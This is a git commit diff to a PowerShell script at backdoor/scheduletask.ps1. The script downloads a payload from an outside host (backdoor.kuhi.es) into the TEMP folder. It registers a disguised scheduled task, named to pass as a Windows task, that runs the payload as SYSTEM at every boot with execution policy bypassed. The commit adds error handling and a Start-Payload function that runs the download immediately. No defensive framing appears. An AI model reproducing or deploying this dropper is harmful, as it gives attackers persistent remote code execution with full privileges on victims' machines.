d131e56cc8de0d82f8c58ef07c9be4c590e71625
Adrian Hernando <ahsolanas@gmail.com>
2023-12-22 00:19:28 +0100

    Update scheduletask.ps1

--- backdoor/scheduletask.ps1
+++ backdoor/scheduletask.ps1
@@ -7,25 +7,52 @@ if (-not $dc) {
 
 # Function to save the powershell script from a URL in raw format from GitHub
 function Save-Script {
-    $response = Invoke-WebRequest -Uri "http://backdoor.kuhi.es" -MaximumRedirection 0 -ErrorAction Ignore
-    $url = $response.Headers.Location
-    $destino = "$env:TEMP\Powershell\PowershellTask.ps1"
-    Write-Output $destino # for testing only        
-    New-Item -ItemType Directory -Force -Path "$env:TEMP\Powershell"
-    Invoke-WebRequest -Uri $url -OutFile $destino
+    try {
+        $response = Invoke-WebRequest -Uri "http://backdoor.kuhi.es" -MaximumRedirection 0 -ErrorAction Ignore
+        $url = $response.Headers.Location
+        $destino = "$env:TEMP\Powershell\PowershellTask.ps1"
+        Write-Output $destino # for testing only        
+        New-Item -ItemType Directory -Force -Path "$env:TEMP\Powershell"
+        Invoke-WebRequest -Uri $url -OutFile $destino
+    }
+    catch {
+        Write-Error "$_"
+    }
 }
 
 # Function to create a scheduled task to run the script in every boot
 function Set-ScheduledTask {
-    $taskName = "Windows scheduled task for powershell"
-    $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Ep Bypass -dc '$dc' -File '$destino'"
-    $taskTrigger = New-ScheduledTaskTrigger -AtStartup
-    $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd
-    $taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
-    $task = Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings -Principal $taskPrincipal -Force
-    $task | Out-Null
+    try {
+        $taskName = "Windows scheduled task for powershell"
+        $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Ep Bypass -dc '$dc' -File '$destino'"
+        $taskTrigger = New-ScheduledTaskTrigger -AtStartup
+        $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd
+        $taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
+        $task = Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings -Principal $taskPrincipal -Force
+        $task | Out-Null
+    }
+    catch {
+        Write-Error "$_"
+    }
+}
+
+# Create a function to run the downloaded script
+function Start-Payload {
+    try {
+        $command = "powershell.exe -Ep Bypass -dc '$dc' -File '$destino'"
+        Invoke-Expression $command
+    }
+    catch {
+        Write-Error "$_"
+    }
 }
 
 # Execute the functions
-Save-Script
-Set-ScheduledTask
+try {
+    Save-Script
+    Set-ScheduledTask
+    Start-Payload
+}
+catch {
+    Write-Error "An error occurred during script execution"
+}
